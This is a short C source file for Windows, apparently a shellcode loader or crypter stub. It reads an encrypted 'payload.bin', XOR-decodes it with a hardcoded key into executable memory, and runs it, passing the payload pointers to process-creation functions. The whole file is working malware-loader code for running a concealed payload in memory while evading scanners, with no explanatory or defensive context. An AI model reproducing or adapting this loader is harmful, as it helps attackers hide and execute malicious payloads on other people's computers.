#include <stdio.h>
#include <windows.h>
#include "encrypt.h"

typedef void (*payload_t)(
    int (*CloseHandle)(HANDLE hObject),
    int (*CreateProcess)(
        LPCWSTR lpApplicationName,
        LPWSTR lpCommandLine,
        LPSECURITY_ATTRIBUTES lpProcessAttributes,
        LPSECURITY_ATTRIBUTES lpThreadAttributes,
        BOOL bInheritHandles,
        DWORD dwCreationFlags,
        LPVOID lpEnvironment,
        LPCWSTR lpCurrentDirectory,
        LPSTARTUPINFOW lpStartupInfo,
        LPPROCESS_INFORMATION lpProcessInformation
    ),
    LPWSTR (*GetCommandLine)(VOID)
);

int main(void) {
    FILE *payload = fopen("payload.bin", "rb");
    void *exec = VirtualAlloc(0, BUFSIZ, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    char buff[BUFSIZ];

    if (payload == NULL) {
        return 1;
    }

    fread(buff, sizeof(char), BUFSIZ, payload);
    fclose(payload);

    char key[] = "my simple key";
    int lenkey = strlen(key);

    encrypt_xor(exec, buff, BUFSIZ, key, lenkey);

    ((payload_t)exec)(CloseHandle, CreateProcess, GetCommandLine);
    VirtualFree(exec, BUFSIZ, MEM_RELEASE);

    return 0;
}